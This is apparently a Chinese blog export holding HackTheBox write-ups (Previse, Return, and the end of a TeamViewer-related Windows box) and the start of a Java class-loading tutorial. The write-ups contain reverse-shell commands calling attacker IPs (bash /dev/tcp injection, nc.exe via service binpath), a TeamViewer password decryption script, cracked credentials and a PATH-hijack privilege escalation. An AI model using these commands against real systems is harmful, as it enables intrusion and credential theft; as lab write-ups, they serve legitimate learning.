<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171658.png" ></p>
<p>思路是先停止这个服务，然后修改服务中的程序路径，再重启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sc.exe stop UsoSvc</span><br><span class="line">2. sc.exe config UsoSvc binpath= &quot;c:/users/public/nc.exe 10.10.16.3 3333 -e powershell&quot;</span><br><span class="line">3. sc.exe start UsoSvc</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408172259.png" ></p>
<p>然后本地开启监听，就拿到system权限，这里有个问题是这个shell会很快就断开，可以拿到后再反弹一次</p>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>查找本机所有正在运行的进程以及它们所托管的服务，找到<code>TeamViewer</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.30.40.png" ></p>
<p>有一个<a class="link"   href="https://www.cnblogs.com/unicodeSec/p/12294868.html" >CVE-2019-18988<i class="fas fa-external-link-alt"></i></a>，teamviewer将用户名密码硬编码至注册表中，加密算法是：<code>AES-128-CBC</code></p>
<p>其中key的值：0602000000a400005253413100040000，iv的值：0100010067244F436E6762F25EA8D704 是固定的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7</span><br></pre></td></tr></table></figure>

<p>查看TeamViewer详细信息，找到SecurityPasswordAES<code>的值</code>FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B</p>
<p>用以下脚本解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hexdump, binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESCipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>):</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, iv, data</span>):</span><br><span class="line">        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> self.cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line">key = binascii.unhexlify(<span class="string">&quot;0602000000a400005253413100040000&quot;</span>)</span><br><span class="line">iv = binascii.unhexlify(<span class="string">&quot;0100010067244F436E6762F25EA8D704&quot;</span>)</span><br><span class="line">hex_str_cipher = <span class="string">&quot;FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B&quot;</span>            <span class="comment"># output from the registry</span></span><br><span class="line"></span><br><span class="line">ciphertext = binascii.unhexlify(hex_str_cipher)</span><br><span class="line"></span><br><span class="line">raw_un = AESCipher(key).decrypt(iv, ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(raw_un))</span><br><span class="line"></span><br><span class="line">password = raw_un.decode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.57.41.png" ></p>
<p>解出密码:!R3m0te!</p>
<p>测试这个密码能否登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.180 -u administrator -p &#x27;!R3m0te!&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174116.png" ></p>
<p>是可以的，然后就用Evil-WinRM登陆，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174240.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>涉及知识点：nfs挂载，poc利用，windows反弹shell，windows提权，TeamViewer提权。。。</p>
<p>整体思路：ftp找不到有用文件–&gt;80端口http服务找到CMS和登陆框–&gt;nfs服务发现文件夹，挂载出来–&gt;找到admin的账号密码–&gt;登陆CMS后发现相关版本–&gt;找到公开漏洞poc进行RCE–&gt;获得一个shell–&gt;自动化提权工具找到UsoSvc提权&#x2F;找到有Teamviewer服务用公开方法解密出脚本登陆adminitrator</p>
<p>总体思路应该算是简单的，思路不曲折，过程中接触到的东西几乎都是新的，所以写下来，以后就了解了。</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb previse复盘</title>
    <url>/2024/09/13/htb-previse%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">─# nmap -A -p- --min-rate=1000 -T4 10.10.11.104</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 19:03 PDT</span><br><span class="line">Nmap scan report for 10.10.11.104</span><br><span class="line">Host is up (0.52s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)</span><br><span class="line">|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)</span><br><span class="line">|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-title: Previse Login</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=9/12%OT=22%CT=1%CU=42757%PV=Y%DS=2%DC=T%G=Y%TM=66E3</span><br><span class="line">OS:9E0F%P=aarch64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A</span><br><span class="line">OS:)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53A</span><br><span class="line">OS:ST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1</span><br><span class="line">OS:=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O</span><br><span class="line">OS:=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N</span><br><span class="line">OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=</span><br><span class="line">OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF</span><br><span class="line">OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=</span><br><span class="line">OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3389/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   414.58 ms 10.10.16.1</span><br><span class="line">2   587.74 ms 10.10.11.104</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 165.33 seconds</span><br></pre></td></tr></table></figure>

<p>只有22和80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100648.png" ></p>
<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>先访问80端口，只有一个登陆口，尝试了密码爆破和sql注入，都不成功，后面看的官方对机器的描述是关于重定向的，扫到的nav.php，点到其他php都会定向会login.php。看一下bp历史包</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100810.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100944.png" ></p>
<p>可以看到返回包里有accounts.php的详细内容，但是状态码是302，我们尝试bp抓包后”Do interact”，修改返回包的状态码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101145.png" ></p>
<p>这下就不会被重定向到login.php，可以看到正常的account页面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101238.png" ></p>
<p>我们在这里新建一个用户，再正常登陆，登陆后就不会被重定向了</p>
<p>然后再download.php找到一个可以下载的压缩包<code>SITEBACKUP.zip</code>，下载下来是网站的源码，config.php可以看到mysql登陆账号密码，后面可以用，经过一番搜寻，在logs.php里面发现<code>exec</code>函数，里面的变量可控，大概率存在代码注入漏洞</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101933.png" ></p>
<p>找到导出log的php，抓到包</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913102148.png" ></p>
<p>改变一下delim变量值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delim=%3bbash+-c+&#x27;bash+-i+&gt;%26+/dev/tcp/10.10.16.4/1234+0&gt;%261&#x27;%3b</span><br></pre></td></tr></table></figure>

<p>成功反弹shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>拿到第一反应是先登陆mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@previse:/var/www/html$ mysql -u root -p&#x27;mySQL_p@ssw0rd!:)&#x27; -e &#x27;use previse;select * from accounts;&#x27;</span><br><span class="line">&lt;ssw0rd!:)&#x27; -e &#x27;use previse;select * from accounts;&#x27;</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">id      username        password        created_at</span><br><span class="line">1       m4lwhere        $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.        2021-05-27 18:18:36</span><br><span class="line">2       admin   $1$🧂llol$G3KunFyMrVvsqYP1JpRi70        2024-09-13 02:06:23</span><br></pre></td></tr></table></figure>

<p>拿到 <code>m4lwhere</code>的加盐密码，还要看到他是什么类型的哈希</p>
<p>然后在accounts.php源码找到存储逻辑</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913103416.png" ></p>
<p>Crypt()函数，md5加密来的，于是指定john的爆破格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john hash --wordlist=/home/kali/Desktop/rockyou.txt --format=md5crypt-long</span><br></pre></td></tr></table></figure>

<p>最后拿到密码<code>ilovecody112235!</code>登陆m4lwhere</p>
<p>第一件事sudo -l，找到一个可以用的脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">m4lwhere@previse:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> m4lwhere: </span><br><span class="line">User m4lwhere may run the following commands on previse:</span><br><span class="line">    (root) /opt/scripts/access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ <span class="built_in">ls</span> -l /opt/scripts/access_backup.sh</span><br><span class="line">-rwxr-xr-x 1 root root 486 Jun  6  2021 /opt/scripts/access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ <span class="built_in">cat</span> /opt/scripts/access_backup.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We always make sure to store logs, we take security SERIOUSLY here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span></span><br><span class="line"><span class="comment"># This is configured to run with cron, added to sudo so I can run as needed - we&#x27;ll fix it later when there&#x27;s time</span></span><br><span class="line"></span><br><span class="line">gzip -c /var/log/apache2/access.log &gt; /var/backups/$(<span class="built_in">date</span> --<span class="built_in">date</span>=<span class="string">&quot;yesterday&quot;</span> +%Y%b%d)_access.gz</span><br><span class="line">gzip -c /var/www/file_access.log &gt; /var/backups/$(<span class="built_in">date</span> --<span class="built_in">date</span>=<span class="string">&quot;yesterday&quot;</span> +%Y%b%d)_file_access.gz</span><br></pre></td></tr></table></figure>

<p>没有修改权限，第一反应是修改环境变量，里面用到gzip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> -ne <span class="string">&#x27;#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash&#x27;</span> &gt; gzip</span><br><span class="line"><span class="built_in">chmod</span> +x gzip</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">sudo /opt/scripts/access_backup.sh</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913104313.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>真感觉htb质量高，难度适中，什么知识点都需要，最开始重定向分析那个算是基础，这次复盘下来也是加深了印象，拿到源码后审计这块真需要耐心。。。</p>
<p>\server\index.php<br>\server\simplewind\Core\ThinkPHP.php<br>\server\simplewind\Core\Library\Think\Think.class.php<br>\server\simplewind\Core\Library\Think\Storage.class.php<br>\server\simplewind\Core\Library\Think\Storage\Driver\File.class.php<br>\server\simplewind\Core\Mode\common.php<br>\server\simplewind\Core\Common\functions.php<br>\server\application\Common\Common\function.php<br>\server\simplewind\Core\Library\Think\Hook.class.php<br>\server\simplewind\Core\Library\Think\App.class.php<br>\server\simplewind\Core\Library\Think\Dispatcher.class.php<br>\server\simplewind\Core\Library\Think\Route.class.php<br>\server\simplewind\Core\Library\Think\Controller.class.php<br>\server\simplewind\Core\Library\Think\View.class.php<br>\server\simplewind\Core\Library\Behavior\BuildLiteBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ParseTemplateBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ContentReplaceBehavior.class.php<br>\server\simplewind\Core\Conf\convention.php<br>\server\application\Common\Conf\config.php<br>\server\data\conf\db.php<br>\server\data\conf\config.php<br>\server\data\conf\route.php<br>\server\application\Common\Conf\alias.php<br>\server\application\Common\Conf\tags.php<br>\server\simplewind\Core\Lang\zh-cn.php<br>\server\simplewind\Core\Conf\debug.php<br>\server\application\Common\Conf\debug.php<br>\server\application\Common\Behavior\InitHookBehavior.class.php<br>\server\simplewind\Core\Library\Think\Behavior.class.php<br>\server\simplewind\Core\Library\Think\Cache.class.php<br>\server\simplewind\Core\Library\Think\Cache\Driver\File.class.php<br>\server\application\Common\Common\extend.php<br>\server\application\Portal\Conf\config.php<br>\server\application\Portal\Common\function.php<br>\server\simplewind\Core\Library\Behavior\ReadHtmlCacheBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\CheckLangBehavior.class.php<br>\server\application\Common\Lang\zh-cn.php<br>\server\application\Portal\Controller\IndexController.class.php<br>\server\application\Common\Controller\HomebaseController.class.php<br>\server\application\Common\Controller\AppframeController.class.php<br>\server\simplewind\Core\Library\Think\Template.class.php<br>\server\simplewind\Core\Library\Think\Template\TagLib\Cx.class.php<br>\server\simplewind\Core\Library\Think\Template\TagLib.class.php<br>\server\application\Common\Lib\Taglib\TagLibSpadmin.class.php<br>\server\application\Common\Lib\Taglib\TagLibHome.class.php<br>\server\application\Portal\Lib\Taglib\Portal.class.php<br>\server\data\runtime\Cache\Portal\5c2fc9f3dd331fb0470c86f0c6552505.php<br>\server\simplewind\Core\Library\Think\Model.class.php<br>\server\simplewind\Core\Library\Think\Db.class.php<br>\server\simplewind\Core\Library\Think\Db\Driver\Mysql.class.php<br>\server\simplewind\Core\Library\Think\Db\Driver.class.php<br>\server\simplewind\Lib\Util\Tree.class.php<br>\server\simplewind\Core\Library\Behavior\WriteHtmlCacheBehavior.class.php<br>\server\application\Common\Behavior\TmplStripSpaceBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ShowPageTraceBehavior.class.php</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb return复盘</title>
    <url>/2024/04/09/htb-return%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>这个靶机比较简单，就边做边记录了📝</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/440073688" >https://zhuanlan.zhihu.com/p/440073688<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/Purpose_7/article/details/128562358" >https://blog.csdn.net/Purpose_7/article/details/128562358<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Return" >https://app.hackthebox.com/machines/Return<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：我觉得比easy还easy</p>
<p>ip：10.10.11.108</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204704.png"   style="zoom:50%;" >

<p>扫到很多端口，先看看80端口，有个setting.php，起始长这样</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204749.png" ></p>
<p>像是在配置一个服务，需要填address，389对于ldap服务</p>
<p>思路是把地址改成本地ip，本地开启监听389端口，点击update，收到一串密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204957.png" ></p>
<p>用来登录svc-printer账户，没想到第一个flag拿的这么轻松</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>看一下svc-printer账户详情</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2021.03.47.png" ></p>
<p>他有Server Operator权限，“<strong>Members of this group can start&#x2F;stop system services</strong>”</p>
<p>那接下来的思路就是上传一个nc.exe，停止某个服务，修改某个服务的路径，再启动服务，就会反弹shell</p>
<p>这里选的服务是Windows自带的卷影复制服务<code>vss</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.16.3/nc64.exe&#x27;,&#x27;C:\Users\svc-printer\desktop\nc.exe&#x27;)&quot;</span><br><span class="line"># 下载一个nc.exe</span><br><span class="line">sc.exe stop vss # 停止vss</span><br><span class="line">sc.exe config vss binPath=&quot;C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.16.3 8888&quot; # 修改服务路径</span><br><span class="line">sc.exe start vss # 开启服务</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409210956.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409211018.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>目前遇到最简单的windows靶机，虽然开了很多端口但是没什么用，学习到Server Operator权限相关内容，不错</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>java反序列化基础之类加载</title>
    <url>/2025/02/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>cc链看到cc3，涉及到类加载，之前囫囵吞枣地学了些，还是不够牢固。于是写篇笔记给自己理清楚。参考了很多前辈的文章，感谢，如果有任何不对的，欢迎找我指正🙏</p>
<h4 id="Java类加载机制"><a href="#Java类加载机制" class="headerlink" title="Java类加载机制"></a>Java类加载机制</h4><p>借用网上一张图</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250214132308.png"   style="zoom:50%;" >

<p>.java 编译后生成 .class文件保存在本地，如果我们要执行class文件，就需要经过一系列的生命周期和初始化操作，最后目的就是让JVM成功执行。</p>
<p>看这个流程图就知道<strong>类的加载就是由java类加载器实现的，作用将类文件进行动态加载到java虚拟机内存中运行。</strong></p>
<h4 id="几个类加载器"><a href="#几个类加载器" class="headerlink" title="几个类加载器"></a>几个类加载器</h4><h5 id="BootstrapClassLoader"><a href="#BootstrapClassLoader" class="headerlink" title="BootstrapClassLoader"></a>BootstrapClassLoader</h5><p>这个也叫引导类加载器，比较底层，由C++代码编写，属于JVM的一部分。不继承 <code>java.lang.ClassLoader</code> 类，也没有父加载器，主要负责加载核心 java 库(即 JVM 本身)，存储在 <code>/jre/lib/rt.jar</code> 目录当中。(同时处于安全考虑，<code>BootstrapClassLoader</code> 只加载包名为 <code>java</code>、<code>javax</code>、<code>sun</code> 等开头的类)。</p>
<h5 id="ExtensionsClassLoader"><a href="#ExtensionsClassLoader" class="headerlink" title="ExtensionsClassLoader"></a>ExtensionsClassLoader</h5><p>也叫拓展类加载器，由 <code>sun.misc.Launcher$ExtClassLoader</code> 类实现，用来在 <code>/jre/lib/ext</code> 或者 <code>java.ext.dirs</code> 中指明的目录加载 java 的扩展库。Java 虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载 java 类。</p>
<h5 id="AppClassLoader"><a href="#AppClassLoader" class="headerlink" title="AppClassLoader"></a>AppClassLoader</h5><p>App类加载器&#x2F;系统类加载器（AppClassLoader），由 <code>sun.misc.Launcher$AppClassLoader</code> 实现，一般通过( <code>java.class.path</code> 或者 <code>Classpath</code> 环境变量)来加载 Java 类，也就是我们常说的 classpath 路径。通常我们是使用这个加载类来加载 Java 应用类，可以使用 <code>ClassLoader.getSystemClassLoader()</code> 来获取它。</p>
<h5 id="UserDefineClassLoader"><a href="#UserDefineClassLoader" class="headerlink" title="UserDefineClassLoader"></a>UserDefineClassLoader</h5><p>除了上面说的三种，用户还可以通过继承<code>java.lang.ClassLoader</code>类的方式实现自己的类加载器。</p>
<p>我们介绍的几个ClassLoader之间有父子关系（不是继承），在Java.lang.ClassLoader里面定义了指向父加载器的常量 parent, 可以通过调用 getParent() 方法获取父加载器。可以看一个代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(ClassLoader.getSystemClassLoader());</span><br><span class="line">        System.out.println(ClassLoader.getSystemClassLoader().getParent());</span><br><span class="line">        System.out.println(ClassLoader.getSystemClassLoader().getParent().getParent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印出来是（这里的null其实就是BootstrapClassLoader，因为是c++实现的，所以无法在java中获取到相应的引用）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sun.misc.Launcher$AppClassLoader@5ce65a89</span><br><span class="line">sun.misc.Launcher$ExtClassLoader@1edf1c96</span><br><span class="line">null</span><br></pre></td></tr></table></figure>

<p>几个ClassLoader关系如下：</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250214141003.png" ></p>
<p>所有ClassLoader都继承自<code>java.lang.ClassLoader</code> 这个抽象类， ExtClassLoader 和 AppClassLoader 继承自 <code>URLClassLoader</code>， <code>URLClassLoader</code>既可以加载本地字节码，也可以加载远程字节码。</p>
<p><code>java.lang.ClassLoader</code> 是所有 ClassLoader 的基石，在这个抽象类中定义了几个比较重要的方法</p>
<ul>
<li>loadClass(): 基于双亲委派机制查找 Class, 调用父加载器的 loadClass 方法或自身的 findClass 方法</li>
<li>findClass(): 根据名称和位置读取字节码, 并调用 defineClass 方法, 具体实现由子类重写</li>
<li>defineClass(): 把 byte 数组形式的字节码转换成对应的 Class 对象 (真正加载字节码的地方)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loadClass() -&gt; findClass() -&gt; defineClass()</span><br></pre></td></tr></table></figure>

<h4 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h4><p>先说一下class有两种加载方式</p>
<ul>
<li><p>隐式加载：通过 new 实例化类, 或通过 <code>类名.方法名()</code> 调用其静态方法, 或调用其静态属性</p>
</li>
<li><p>显式加载：通过反射的形式, 例如 <code>Class.forName()</code> 或者调用 ClassLoader 的 loadClass 方法</p>
</li>
</ul>
<p>然后我们的类加载基于双亲委派机制：<strong>当一个类加载器收到了类加载的请求的时候，他不会直接去加载指定的类，而是把这个请求委托给自己的父加载器去加载。只有父加载器无法加载这个类的时候，才会由当前这个加载器来负责类的加载</strong></p>
<p>可以看一下实现代码，<strong>java.lang.ClassLoader的loadClass()方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">            <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">            Class&lt;?&gt; c = findLoadedClass(name); <span class="comment">// 检查类是否已经被加载</span></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                        c = parent.loadClass(name, <span class="literal">false</span>); <span class="comment">// 调用父类的loadClass，委托下一层</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        c = findBootstrapClassOrNull(name); <span class="comment">// 此时父加载器为 BootstrapClassLoader</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                    c = findClass(name); <span class="comment">// 尝试调用自己的 findClass 方法来加载 class</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>简单流程就是1、先检查类是否已经被加载过 2、若没有加载则调用父加载器的loadClass()方法进行加载 3、若父加载器为空则默认使用启动类加载器作为父加载器。 4、如果父类加载失败，抛出ClassNotFoundException异常后，再调用自己的findClass()方法进行加载。</p>
<h4 id="不同场景下代码块加载顺序"><a href="#不同场景下代码块加载顺序" class="headerlink" title="不同场景下代码块加载顺序"></a>不同场景下代码块加载顺序</h4><p>基础认知</p>
<ul>
<li>静态代码块：<code>static&#123;&#125;</code></li>
<li>构造代码块：<code>&#123;&#125;</code></li>
<li>无参构造器：<code>ClassName()</code></li>
<li>有参构造器：<code>ClassName(String name)</code></li>
</ul>
<p>先写一个Dog.java</p>
